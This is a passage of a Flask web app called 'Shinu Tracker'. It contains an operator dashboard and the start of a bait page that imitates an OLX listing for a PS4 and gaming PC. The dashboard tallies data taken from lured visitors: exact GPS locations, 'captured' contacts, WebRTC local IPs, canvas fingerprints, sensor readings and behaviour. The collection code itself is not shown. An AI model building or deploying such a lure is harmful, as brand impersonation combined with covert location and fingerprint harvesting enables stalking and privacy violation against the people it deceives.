            "contato_falso":         "📞",
            "sensores_dispositivo":  "📡",
            "comportamento_usuario": "🖱️",
            "scan_detectado":        "⚠️",
        }
        for row in rows:
            cidade = row["cidade"] or ""
            pais   = row["pais"]   or ""
            local  = f"{cidade}, {pais}" if cidade else row["ip"]
            stats["eventos_recentes"].append({
                "icone":  icones.get(row["tipo"], "📋"),
                "evento": row["tipo"].replace("_", " ").title(),
                "ip":     row["ip"],
                "local":  local,
                "ts":     row["timestamp"],
            })

        con.close()
    except Exception as e:
        logger.error(f"Stats DB erro: {e}")

    stats["ips_unicos"]  = len(stats["ips_unicos"])
    stats["top_paises"]  = dict(sorted(
        stats["top_paises"].items(),  key=lambda x: x[1], reverse=True)[:6])
    stats["top_isps"]    = dict(sorted(
        stats["top_isps"].items(),    key=lambda x: x[1], reverse=True)[:6])
    stats["top_cidades"] = dict(sorted(
        stats["top_cidades"].items(), key=lambda x: x[1], reverse=True)[:6])

    return jsonify(stats)


# ── dashboard ─────────────────────────────────────────────────────
@app.route("/dashboard")
def dashboard():
    return render_template_string(DASHBOARD_HTML)


# ═══════════════════════════════════════════════════════════════════
# DASHBOARD HTML — tema roxo Shinu
# ═══════════════════════════════════════════════════════════════════
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Shinu Tracker — Painel</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  :root {
    --bg:      #0a0a0f;
    --surface: #111118;
    --surface2:#18181f;
        --border:  #2a2a3d;
    --roxo:    #7c3aed;
    --roxo2:   #9d5cff;
    --roxo3:   #c084fc;
    --rosa:    #f472b6;
    --text:    #e2e8f0;
    --muted:   #64748b;
    --green:   #4ade80;
    --red:     #f87171;
    --yellow:  #fbbf24;
    --blue:    #60a5fa;
  }

  body {
    font-family: 'Segoe UI', system-ui, sans-serif;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
  }

  /* ── scrollbar ── */
  ::-webkit-scrollbar { width: 5px; height: 5px; }
  ::-webkit-scrollbar-track { background: var(--bg); }
  ::-webkit-scrollbar-thumb { background: var(--roxo); border-radius: 3px; }

  /* ── topbar ── */
  .topbar {
    background: var(--surface);
    border-bottom: 1px solid var(--border);
    padding: 0 28px;
    height: 58px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: sticky;
    top: 0;
    z-index: 100;
    box-shadow: 0 1px 20px rgba(124,58,237,.15);
  }
  .topbar-brand {
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 17px;
    font-weight: 800;
    letter-spacing: .5px;
    background: linear-gradient(135deg, var(--roxo2), var(--rosa));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
  }
  .topbar-brand .logo-icon { font-size: 22px; }
  .badge-live {
    background: var(--red);
    color: #fff;
    font-size: 9px;
    font-weight: 800;
    padding: 2px 8px;
    border-radius: 20px;
    letter-spacing: 1.5px;
    animation: pulse 1.4s infinite;
    -webkit-text-fill-color: #fff;
  }
  @keyframes pulse {
    0%,100% { opacity: 1; box-shadow: 0 0 0 0 rgba(248,113,113,.4); }
    50%      { opacity: .7; box-shadow: 0 0 0 6px rgba(248,113,113,0); }
  }
  .topbar-right {
    display: flex;
    align-items: center;
    gap: 16px;
    font-size: 12px;
    color: var(--muted);
  }
  #ultimo-acesso { color: var(--roxo3); font-weight: 600; }

  .btn-refresh {
    background: transparent;
    border: 1px solid var(--border);
    color: var(--muted);
    padding: 6px 14px;
    border-radius: 8px;
    font-size: 12px;
    cursor: pointer;
    transition: all .2s;
    display: flex;
    align-items: center;
    gap: 6px;
  }
  .btn-refresh:hover {
    border-color: var(--roxo2);
    color: var(--roxo3);
    background: rgba(124,58,237,.1);
  }
  .spin { animation: spin .7s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }

  /* ── container ── */
  .container {
    max-width: 1300px;
    margin: 0 auto;
    padding: 24px 20px;
  }

  /* ── section title ── */
  .section-title {
    font-size: 11px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 1.5px;
    color: var(--muted);
    margin-bottom: 14px;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .section-title::after {
    content: '';
    flex: 1;
    height: 1px;
    background: var(--border);
  }

  /* ── métricas ── */
  .metrics {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(170px, 1fr));
    gap: 14px;
    margin-bottom: 24px;
  }
  .metric-card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 14px;
    padding: 18px 20px;
    display: flex;
    flex-direction: column;
    gap: 8px;
    position: relative;
    overflow: hidden;
    transition: transform .2s, border-color .2s, box-shadow .2s;
    cursor: default;
  }
  .metric-card::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 2px;
  }
  .metric-card::after {
    content: '';
    position: absolute;
    top: -30px; right: -30px;
    width: 80px; height: 80px;
    border-radius: 50%;
    opacity: .06;
  }
  .metric-card:hover {
    transform: translateY(-3px);
    box-shadow: 0 8px 30px rgba(124,58,237,.2);
    border-color: var(--roxo);
  }
  .mc-roxo::before  { background: linear-gradient(90deg,var(--roxo),var(--roxo2)); }
  .mc-roxo::after   { background: var(--roxo2); }
  .mc-rosa::before  { background: linear-gradient(90deg,var(--rosa),#fb7185); }
  .mc-rosa::after   { background: var(--rosa); }
  .mc-green::before { background: linear-gradient(90deg,var(--green),#86efac); }
  .mc-green::after  { background: var(--green); }
  .mc-yellow::before{ background: linear-gradient(90deg,var(--yellow),#fde68a); }
  .mc-yellow::after { background: var(--yellow); }
  .mc-blue::before  { background: linear-gradient(90deg,var(--blue),#93c5fd); }
  .mc-blue::after   { background: var(--blue); }
  .mc-red::before   { background: linear-gradient(90deg,var(--red),#fca5a5); }
  .mc-red::after    { background: var(--red); }

  .metric-icon { font-size: 24px; }
  .metric-label {
    font-size: 10px;
    text-transform: uppercase;
    letter-spacing: 1.2px;
    color: var(--muted);
    font-weight: 700;
  }
  .metric-value {
    font-size: 34px;
    font-weight: 900;
    color: var(--text);
    line-height: 1;
    font-variant-numeric: tabular-nums;
  }
  .metric-sub { font-size: 11px; color: var(--muted); }

  /* ── grids ── */
  .grid-2 {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 16px;
    margin-bottom: 16px;
  }
  .grid-3 {
    display: grid;
    grid-template-columns: 1fr 1fr 1fr;
    gap: 16px;
    margin-bottom: 16px;
  }
  .grid-4 {
    display: grid;
    grid-template-columns: 1fr 1fr 1fr 1fr;
    gap: 16px;
    margin-bottom: 16px;
  }
  @media (max-width: 1100px) {
    .grid-4 { grid-template-columns: 1fr 1fr; }
  }
  @media (max-width: 800px) {
    .grid-2, .grid-3, .grid-4 { grid-template-columns: 1fr; }
  }

  /* ── panel ── */
  .panel {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 14px;
    overflow: hidden;
    transition: border-color .2s;
  }
  .panel:hover { border-color: rgba(124,58,237,.4); }
  .panel-header {
    padding: 14px 18px;
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    justify-content: space-between;
    background: var(--surface2);
  }
  .panel-title {
    font-size: 13px;
    font-weight: 700;
    color: var(--text);
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .panel-title-accent {
    color: var(--roxo3);
  }
  .panel-body { padding: 16px 18px; }
  .panel-body-flush { padding: 0; }

  /* ── tabela eventos ── */
  .ev-table {
    width: 100%;
    border-collapse: collapse;
    font-size: 12px;
  }
  .ev-table th {
    text-align: left;
    padding: 10px 14px;
    color: var(--muted);
    font-size: 10px;
    text-transform: uppercase;
    letter-spacing: 1px;
    border-bottom: 1px solid var(--border);
    background: var(--surface2);
    font-weight: 700;
  }
  .ev-table td {
    padding: 10px 14px;
    border-bottom: 1px solid var(--border);
    vertical-align: middle;
  }
  .ev-table tr:last-child td { border-bottom: none; }
  .ev-table tr:hover td {
    background: rgba(124,58,237,.05);
  }

  /* ── badges ── */
  .badge {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    padding: 3px 10px;
    border-radius: 20px;
    font-size: 10px;
    font-weight: 700;
    white-space: nowrap;
  }
  .b-roxo  { background: rgba(124,58,237,.2);  color: var(--roxo3); }
  .b-rosa  { background: rgba(244,114,182,.2); color: var(--rosa); }
  .b-green { background: rgba(74,222,128,.2);  color: var(--green); }
  .b-yellow{ background: rgba(251,191,36,.2);  color: var(--yellow); }
  .b-blue  { background: rgba(96,165,250,.2);  color: var(--blue); }
  .b-red   { background: rgba(248,113,113,.2); color: var(--red); }

  /* ── rank bars ── */
  .rank-list { display: flex; flex-direction: column; gap: 12px; }
  .rank-item { display: flex; flex-direction: column; gap: 5px; }
  .rank-top  {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 12px;
  }
  .rank-name  { color: var(--text); font-weight: 500; }
  .rank-count {
    color: var(--roxo3);
    font-weight: 700;
    font-size: 11px;
    background: rgba(124,58,237,.15);
    padding: 1px 8px;
    border-radius: 10px;
  }
  .rank-bar-bg {
    height: 5px;
    background: var(--border);
    border-radius: 4px;
    overflow: hidden;
  }
  .rank-bar-fill {
    height: 100%;
    border-radius: 4px;
    transition: width 1s cubic-bezier(.4,0,.2,1);
  }

  /* ── hora chart ── */
  .hora-chart {
    display: flex;
    align-items: flex-end;
    gap: 3px;
    height: 90px;
  }
  .hora-col {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 4px;
    cursor: default;
  }
  .hora-bar {
    width: 100%;
    border-radius: 3px 3px 0 0;
    background: linear-gradient(180deg, var(--roxo2), var(--roxo));
    opacity: .6;
    transition: opacity .2s;
    min-height: 3px;
  }
  .hora-col:hover .hora-bar { opacity: 1; }
  .hora-label { font-size: 8px; color: var(--muted); }

  /* ── donut ── */
  .donut-wrap {
    display: flex;
    align-items: center;
    gap: 20px;
    flex-wrap: wrap;
  }
  .donut-legend {
    display: flex;
    flex-direction: column;
    gap: 10px;
    font-size: 12px;
    flex: 1;
  }
  .legend-item {
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .legend-dot {
    width: 9px; height: 9px;
    border-radius: 50%;
    flex-shrink: 0;
  }
  .legend-val {
    margin-left: auto;
    color: var(--muted);
    font-size: 11px;
  }

  /* ── stat mini ── */
  .stat-mini {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 4px;
    padding: 16px;
    background: var(--surface2);
    border-radius: 10px;
    border: 1px solid var(--border);
    text-align: center;
  }
  .stat-mini-val {
    font-size: 26px;
    font-weight: 900;
    color: var(--roxo3);
  }
  .stat-mini-label {
    font-size: 10px;
    color: var(--muted);
    text-transform: uppercase;
    letter-spacing: 1px;
  }

  /* ── empty ── */
  .empty {
    text-align: center;
    padding: 36px 20px;
    color: var(--muted);
    font-size: 13px;
  }
  .empty-icon { font-size: 32px; margin-bottom: 8px; }

  /* ── glow effect ── */
  .glow {
    box-shadow: 0 0 20px rgba(124,    58,237,.3);
  }
</style>
</head>
<body>

<!-- ── TOPBAR ── -->
<div class="topbar">
  <div class="topbar-brand">
    <span class="logo-icon">🍯</span>
    Shinu Tracker
    <div class="badge-live">LIVE</div>
  </div>
  <div class="topbar-right">
    <span>Último acesso: <span id="ultimo-acesso">—</span></span>
    <button class="btn-refresh" onclick="carregar()">
      <span id="refresh-icon">↻</span> Atualizar
    </button>
  </div>
</div>

<div class="container">

  <!-- ── SEÇÃO: MÉTRICAS ── -->
  <div class="section-title">📊 Visão Geral</div>
  <div class="metrics">
    <div class="metric-card mc-roxo">
      <div class="metric-icon">🚨</div>
      <div class="metric-label">Total Acessos</div>
      <div class="metric-value" id="m-acessos">0</div>
      <div class="metric-sub">visitas registradas</div>
    </div>
    <div class="metric-card mc-blue">
      <div class="metric-icon">🌐</div>
      <div class="metric-label">IPs Únicos</div>
      <div class="metric-value" id="m-ips">0</div>
      <div class="metric-sub">dispositivos distintos</div>
    </div>
    <div class="metric-card mc-green">
      <div class="metric-icon">📍</div>
      <div class="metric-label">GPS Coletados</div>
      <div class="metric-value" id="m-gps">0</div>
      <div class="metric-sub">localizações exatas</div>
    </div>
    <div class="metric-card mc-rosa">
      <div class="metric-icon">📞</div>
      <div class="metric-label">Contatos</div>
      <div class="metric-value" id="m-contatos">0</div>
      <div class="metric-sub">dados capturados</div>
    </div>
    <div class="metric-card mc-red">
      <div class="metric-icon">⚠️</div>
      <div class="metric-label">Scans</div>
      <div class="metric-value" id="m-scans">0</div>
      <div class="metric-sub">tentativas detectadas</div>
    </div>
    <div class="metric-card mc-yellow">
      <div class="metric-icon">🚫</div>
      <div class="metric-label">Blacklist</div>
      <div class="metric-value" id="m-blacklist">0</div>
      <div class="metric-sub">IPs bloqueados</div>
    </div>
    <div class="metric-card mc-roxo">
      <div class="metric-icon">🔍</div>
      <div class="metric-label">VPNs</div>
      <div class="metric-value" id="m-vpns">0</div>
      <div class="metric-sub">detectadas</div>
    </div>
    <div class="metric-card mc-rosa">
      <div class="metric-icon">🤖</div>
      <div class="metric-label">Bots</div>
      <div class="metric-value" id="m-bots">0</div>
      <div class="metric-sub">identificados</div>
    </div>
  </div>

  <!-- ── SEÇÃO: EVENTOS + DISPOSITIVOS ── -->
  <div class="section-title">⚡ Atividade em Tempo Real</div>
  <div class="grid-2">

    <!-- eventos recentes -->
    <div class="panel">
      <div class="panel-header">
        <div class="panel-title">
          <span class="panel-title-accent">⚡</span> Eventos Recentes
        </div>
        <span class="badge b-roxo" id="badge-total-ev">0 eventos</span>
      </div>
      <div class="panel-body-flush">
        <table class="ev-table">
          <thead>
            <tr>
              <th>Tipo</th>
              <th>IP</th>
              <th>Local</th>
              <th>Hora</th>
            </tr>
          </thead>
          <tbody id="tbody-eventos">
            <tr><td colspan="4">
              <div class="empty">
                <div class="empty-icon">📭</div>
                Aguardando eventos...
              </div>
            </td></tr>
          </tbody>
        </table>
      </div>
    </div>

    <!-- dispositivos donut -->
    <div class="panel">
      <div class="panel-header">
        <div class="panel-title">
          <span class="panel-title-accent">💻</span> Dispositivos
        </div>
      </div>
      <div class="panel-body">
        <div class="donut-wrap">
          <svg width="130" height="130" viewBox="0 0 130 130" style="flex-shrink:0">
            <circle cx="65" cy="65" r="50"
                    fill="none" stroke="#2a2a3d" stroke-width="22"/>
            <g id="donut-arcs"></g>
            <text x="65" y="60" text-anchor="middle"
                  fill="#e2e8f0" font-size="22" font-weight="900"
                  id="donut-center">0</text>
            <text x="65" y="76" text-anchor="middle"
                  fill="#64748b" font-size="9">total</text>
          </svg>
          <div class="donut-legend" id="donut-legend">
            <div class="empty" style="padding:10px">
              <div class="empty-icon">📊</div>Sem dados
            </div>
          </div>
        </div>
      </div>
    </div>

  </div>

  <!-- ── SEÇÃO: RANKINGS ── -->
  <div class="section-title">🌍 Inteligência Geográfica</div>
  <div class="grid-3">

    <div class="panel">
      <div class="panel-header">
        <div class="panel-title">
          <span class="panel-title-accent">🌍</span> Top Países
        </div>
      </div>
      <div class="panel-body">
        <div class="rank-list" id="rank-paises">
          <div class="empty"><div class="empty-icon">🌐</div>Sem dados</div>
        </div>
      </div>
    </div>

    <div class="panel">
      <div class="panel-header">
        <div class="panel-title">
          <span class="panel-title-accent">🏢</span> Top ISPs
        </div>
      </div>
      <div class="panel-body">
        <div class="rank-list" id="rank-isps">
          <div class="empty"><div class="empty-icon">📡</div>Sem dados</div>
        </div>
      </div>
    </div>

    <div class="panel">
      <div class="panel-header">
        <div class="panel-title">
          <span class="panel-title-accent">🏙️</span> Top Cidades
        </div>
      </div>
      <div class="panel-body">
        <div class="rank-list" id="rank-cidades">
          <div class="empty"><div class="empty-icon">🗺️</div>Sem dados</div>
        </div>
      </div>
    </div>

  </div>

  <!-- ── SEÇÃO: GRÁFICO DE HORAS ── -->
  <div class="section-title">🕐 Distribuição Temporal</div>
  <div class="panel" style="margin-bottom:16px">
    <div class="panel-header">
      <div class="panel-title">
        <span class="panel-title-accent">🕐</span> Acessos por Hora do Dia
      </div>
    </div>
    <div class="panel-body">
      <div class="hora-chart" id="hora-chart"></div>
    </div>
  </div>

</div><!-- /container -->

<script>
// ── paleta roxo Shinu ──────────────────────────────────────────
const CORES = [
  '#9d5cff','#f472b6','#4ade80',
  '#fbbf24','#60a5fa','#f87171',
  '#c084fc','#fb923c'
];

const BADGE_MAP = {
  'Coleta Inicial':        ['🚨','b-roxo'],
  'Gps':                   ['📍','b-green'],
  'Ip Local Webrtc':       ['🔐','b-blue'],
  'Canvas Fingerprint':    ['🖼️','b-roxo'],
  'Contato Falso':         ['📞','b-rosa'],
  'Sensores Dispositivo':  ['📡','b-blue'],
  'Comportamento Usuario': ['🖱️','b-roxo'],
  'Scan Detectado':        ['⚠️','b-red'],
};

// ── helpers ────────────────────────────────────────────────────
function fmt(ts) {
  if (!ts) return '—';
  try {
    return new Date(ts).toLocaleTimeString('pt-BR',{
      hour:'2-digit', minute:'2-digit', second:'2-digit'
    });
  } catch { return ts; }
}

function fmtFull(ts) {
  if (!ts) return '—';
  try { return new Date(ts).toLocaleString('pt-BR'); }
  catch { return ts; }
}

function animarNumero(el, valor) {
  if (!el) return;
  const dur  = 900;
  const ini  = performance.now();
  const from = parseInt(el.textContent) || 0;
  function step(now) {
    const p    = Math.min((now - ini) / dur, 1);
    const ease = 1 - Math.pow(1 - p, 4);
    el.textContent = Math.round(from + (valor - from) * ease);
    if (p < 1) requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
}

// ── rank bars ──────────────────────────────────────────────────
function renderRank(id, dados) {
  const el  = document.getElementById(id);
  const max = Math.max(...Object.values(dados), 1);
  if (!Object.keys(dados).length) {
    el.innerHTML = '<div class="empty"><div class="empty-icon">📭</div>Sem dados</div>';
    return;
  }
  el.innerHTML = Object.entries(dados).map(([nome,cnt],i) => `
    <div class="rank-item">
      <div class="rank-top">
        <span class="rank-name">${nome}</span>
        <span class="rank-count">${cnt}</span>
      </div>
      <div class="rank-bar-bg">
        <div class="rank-bar-fill"
             style="width:${Math.round((cnt/max)*100)}%;
                    background:${CORES[i%CORES.length]}">
        </div>
      </div>
    </div>
  `).join('');
}

// ── donut ──────────────────────────────────────────────────────
function renderDonut(disp) {
  const total = Object.values(disp).reduce((a,b)=>a+b,0);
  const arcs  = document.getElementById('donut-arcs');
  const leg   = document.getElementById('donut-legend');
  const ctr   = document.getElementById('donut-center');

  ctr.textContent = total;
  arcs.innerHTML  = '';
  leg.innerHTML   = '';

  if (!total) {
    leg.innerHTML = '<div class="empty" style="padding:10px"><div class="empty-icon">📊</div>Sem dados</div>';
    return;
  }

  const r    = 50;
  const circ = 2 * Math.PI * r;
  let offset = 0;
  const nomes = { Mobile:'📱 Mobile', Desktop:'🖥️ Desktop', Tablet:'📟 Tablet' };
  const cores = ['#9d5cff','#f472b6','#4ade80'];

  Object.entries(disp).forEach(([nome,cnt],i) => {
    if (!cnt) return;
    const dash = (cnt/total) * circ;
    const gap  = circ - dash;

    const arc = document.createElementNS('http://www.w3.org/2000/svg','circle');
    arc.setAttribute('cx','65');
    arc.setAttribute('cy','65');
    arc.setAttribute('r','50');
    arc.setAttribute('fill','none');
    arc.setAttribute('stroke', cores[i%cores.length]);
    arc.setAttribute('stroke-width','22');
    arc.setAttribute('stroke-dasharray', `${dash} ${gap}`);
    arc.setAttribute('stroke-dashoffset', -offset);
    arc.setAttribute('transform','rotate(-90 65 65)');
    arc.style.transition = 'stroke-dasharray 1s ease';
    arcs.appendChild(arc);
    offset += dash;

    const item = document.createElement('div');
    item.className = 'legend-item';
    item.innerHTML = `
      <div class="legend-dot" style="background:${cores[i%cores.length]}"></div>
      <span>${nomes[nome]||nome}</span>
      <span class="legend-val">${cnt} (${Math.round(cnt/total*100)}%)</span>
    `;
    leg.appendChild(item);
  });
}

// ── hora chart ─────────────────────────────────────────────────
function renderHoras(horas) {
  const el  = document.getElementById('hora-chart');
  const max = Math.max(...Object.values(horas), 1);
  el.innerHTML = '';
  for (let h = 0; h < 24; h++) {
    const cnt = horas[String(h)] || 0;
    const pct = Math.round((cnt/max)*100);
    const col = document.createElement('div');
    col.className = 'hora-col';
    col.title = `${String(h).padStart(2,'0')}h — ${cnt} acesso(s)`;
    col.innerHTML = `
      <div class="hora-bar" style="height:${Math.max(pct,3)}%"></div>
      <div class="hora-label">${String(h).padStart(2,'0')}</div>
    `;
    el.appendChild(col);
  }
}

// ── eventos ────────────────────────────────────────────────────
function renderEventos(eventos) {
  const tbody = document.getElementById('tbody-eventos');
  const badge = document.getElementById('badge-total-ev');
  if (badge) badge.textContent = `${eventos.length} eventos`;

  if (!eventos || !eventos.length) {
    tbody.innerHTML = `<tr><td colspan="4">
      <div class="empty">
        <div class="empty-icon">📭</div>Aguardando eventos...
      </div>
    </td></tr>`;
    return;
  }

  tbody.innerHTML = eventos.map(ev => {
    const info  = BADGE_MAP[ev.evento] || ['📋','b-roxo'];
    return `
      <tr>
        <td>
          <span class="badge ${info[1]}">
            ${info[0]} ${ev.evento}
          </span>
        </td>
        <td style="font-family:monospace;font-size:11px;color:#9d5cff">
          ${ev.ip || '—'}
        </td>
        <td style="color:var(--muted);font-size:11px;max-width:140px;
                   overflow:hidden;text-overflow:ellipsis;white-space:nowrap">
          ${ev.local || '—'}
        </td>
        <td style="color:var(--muted);font-size:11px;white-space:nowrap">
          ${fmt(ev.ts)}
        </td>
      </tr>
    `;
  }).join('');
}

// ── carregar dados ─────────────────────────────────────────────
async function carregar() {
  const icon = document.getElementById('refresh-icon');
  icon.classList.add('spin');

  try {
    const resp = await fetch('/api/stats');
    if (!resp.ok) throw new Error('Erro na API');
    const d = await resp.json();

    // métricas
    animarNumero(document.getElementById('m-acessos'),  d.total_acessos   || 0);
    animarNumero(document.getElementById('m-ips'),      d.ips_unicos      || 0);
    animarNumero(document.getElementById('m-gps'),      d.gps_coletados   || 0);
    animarNumero(document.getElementById('m-contatos'), d.contatos        || 0);
    animarNumero(document.getElementById('m-scans'),    d.scans           || 0);
    animarNumero(document.getElementById('m-blacklist'),d.blacklistados   || 0);
    animarNumero(document.getElementById('m-vpns'),     d.vpns_detectadas || 0);
    animarNumero(document.getElementById('m-bots'),     d.bots_detectados || 0);

    // último acesso
    const ua = document.getElementById('ultimo-acesso');
    if (ua) ua.textContent = fmtFull(d.ultimo_acesso) || '—';

    // rankings
    renderRank('rank-paises',  d.top_paises  || {});
    renderRank('rank-isps',    d.top_isps    || {});
    renderRank('rank-cidades', d.top_cidades || {});

    // donut
    renderDonut(d.dispositivos || { Mobile:0, Desktop:0, Tablet:0 });

    // horas
    renderHoras(d.acessos_por_hora || {});

    // eventos
    renderEventos(d.eventos_recentes || []);

  } catch(e) {
    console.error('[Shinu] Erro ao carregar stats:', e);
  } finally {
    icon.classList.remove('spin');
  }
}

// ── auto refresh 15s ───────────────────────────────────────────
carregar();
setInterval(carregar, 15000);
</script>
</body>
</html>
"""

# ═══════════════════════════════════════════════════════════════════
# PÁGINA ISCA
# ═══════════════════════════════════════════════════════════════════
HTML_ISCA = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OLX — Vendo PS4 + PC Gamer e Monitor</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Segoe UI', Arial, sans-serif;
    background: #f2f4f5;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }
  .olx-header {
    background: #fff;
    border-bottom: 1px solid #e0e0e0;
    padding: 0 20px;
    height: 60px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: sticky;
    top: 0;
    z-index: 50;
    box-shadow: 0 1px 4px rgba(0,0,0,.08);
  }
  .olx-logo {
    font-size: 28px;
    font-weight: 900;
    color: #fff;
    background: #6e0ad6;
    padding: 2px 14px;
    border-radius: 6px;
    letter-spacing: -1px;
  }
  .olx-header-right { display: flex; align-items: center; gap: 14px; }
  .olx-btn-outline {
    border: 2px solid #6e0ad6;
    color: #6e0ad6;
    background: transparent;
    padding: 7px 18px;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 700;
    cursor: pointer;
    transition: all .2s;
  }
  .olx-btn-outline:hover { background: #6e0ad6; color: #fff; }
  .olx-btn-solid {
    border: none;
    background: #6e0ad6;
    color: #fff;
    padding: 9px 20px;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 700;
    cursor: pointer;
    transition: background .2s;
  }
  .olx-btn-solid:hover { background: #5a08b0; }
  .breadcrumb {
    max-width: 960px;
    margin: 14px auto 0;
    padding: 0 16px;
    font-size: 12px;
    color: #888;
  }
  .breadcrumb a { color: #888; text-decoration: none; }
  .breadcrumb a:hover { text-decoration: underline; }
  .breadcrumb span { margin: 0 4px; }
  .main {
    max-width: 960px;
    margin: 16px auto 40px;
    padding: 0 16px;
    display: grid;
    grid-template-columns: 1fr 340px;
    gap: 20px;
    align-items: start;
  }
  @media (max-width: 720px) { .main { grid-template-columns: 1fr; } }
  .gallery {
    background: #fff;
    border-radius: 12px;
    overflow: hidden;
    border: 1px solid #e0e0e0;
  }
  .gallery-main {
    width: 100%;
    height: 320px;
    background: linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 90px;
    position: relative;
  }
  .gallery-expired-overlay {
    position: absolute;
    inset: 0;
    background: rgba(0,0,0,.55);
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .expired-badge {
    background: #ff4444;
    color: #fff;
    font-size: 15px;
    font-weight: 800;
    padding: 10px 28px;
    border-radius: 6px;
    letter-spacing: 1px;
    text-transform: uppercase;
    box-shadow: 0 4px 20px rgba(255,68,68,.4);
  }
  .gallery-thumbs {
    display: flex;
    gap: 8px;
    padding: 10px;
    background: #fafafa;
    border-top: 1px solid #e0e0e0;
  }
  .thumb {
    width: 60px;
    height: 50px;
    border-radius: 6px;
    background: linear-gradient(135deg,#1a1a2e,#0f3460);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 22px;
    cursor: pointer;
    border: 2px solid transparent;
    transition: border-color .2s;
    flex-shrink: 0;
  }
  .thumb.active { border-color: #6e0ad6; }
  .ad-info {
    background: #fff;
    border-radius: 12px;
    border: 1px solid #e0e0e0;
    padding: 20px;
    margin-top: 16px;
  }
  .ad-category { font-size: 12px; color: #888; margin-bottom: 8px; }
  .ad-title {
    font-size: 22px;
    font-weight: 700;
    color: #222;
    margin-bottom: 12px;
    line-height: 1.3;
  }
  .ad-meta {
    display: flex;
    gap: 16px;
    font-size: 12px;
    color: #999;
    margin-bottom: 16px;
    flex-wrap: wrap;
  }
  .ad-meta span { display: flex; align-items: center; gap: 4px; }
  .ad-desc-title {
    font-size: 14px;
    font-weight: 700;
    color: #333;
    margin-bottom: 8px;
    padding-top: 16px;
    border-top: 1px solid #f0f0f0;
  }
  .ad-desc { font-size: 14px; color: #555; line-height: 1.7; }
  .ad-tags { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 16px; }
  .ad-tag {
    background: #f2f4f5;
    color: #555;
    font-size: 12px;
    padding: 4px 12px;
    border-radius: 20px;
    border: 1px solid #e0e0e0;
  }
  .sidebar { display: flex; flex-direction: column; gap: 16px; }
  .price-card {
    background: #fff;
    border-radius: 12px;
    border: 1px solid #e0e0e0;
    padding: 20px;
  }
  .price-label { font-size: 12px; color: #888; margin-bottom: 4px; }
  .price-value { font-size: 32px; font-weight: 900; color: #222; margin-bottom: 16px; }
  .btn-primary {
    width: 100%;
    background: #6e0ad6;
    color: #fff;
    border: none;
    padding: 14px;
    border-radius: 10px;
    font-size: 15px;
    font-weight: 700;
    cursor: pointer;
    transition: background .2s, transform .1s;
    margin-bottom: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
  }
  .btn-primary:hover { background: #5a08b0; transform: translateY(-1px); }
  .btn-primary:active { transform: translateY(0); }
  .btn-secondary {
    width: 100%;
    background: #fff;
    color: #6e0ad6;
    border: 2px solid #6e0ad6;
    padding: 13px;
    border-radius: 10px;
    font-size: 15px;
    font-weight: 700;
    cursor: pointer;
    transition: all .2s;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
  }
  .btn-secondary:hover { background: #f5eeff; transform: translateY(-1px); }
  .seller-card {
    background: #fff;
    border-radius: 12px;
    border: 1px solid #e0e0e0;
    padding: 20px;
  }
  .seller-title {
    font-size: 13px;
    font-weight: 700;
    color: #333;
    margin-bottom: 14px;
    text-transform: uppercase;
    letter-spacing: .5px;
  }
  .seller-info { display: flex; align-items: center; gap: 12px; margin-bottom: 14px; }
  .seller-avatar {
    width: 48px;
    height: 48px;
    border-radius: 50%;
    background: linear-gradient(135deg,#6e0ad6,#a855f7);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 22px;
    flex-shrink: 0;
  }
  .seller-name { font-size: 15px; font-weight: 700; color: #222; }
  .seller-since { font-size: 12px; color: #888; margin-top: 2px; }
  .seller-stats {
    display: flex;
    gap: 12px;
    font-size: 12px;
    color: #666;
    padding-top: 12px;
    border-top: 1px solid #f0f0f0;
  }
  .seller-stat {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 2px;
    flex: 1;
    text-align: center;
  }
  .seller-stat strong { font-size: 16px; color: #222; font-weight: 800; }
  .safety-card {
    background: #fff8e1;
    border-radius: 12px;
    border: 1px solid #ffe082;
    padding: 16px;
    font-size: 12px;
    color: #795548;
    line-height: 1.6;
  }
  .safety-card strong { display: block; margin-bottom: 6px; color: #5d4037; font-size: 13px; }
  .modal-overlay {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,.6);
    z-index: 200;
    align-items: center;
    justify-content: center;
    backdrop-filter: blur(3px);
  }
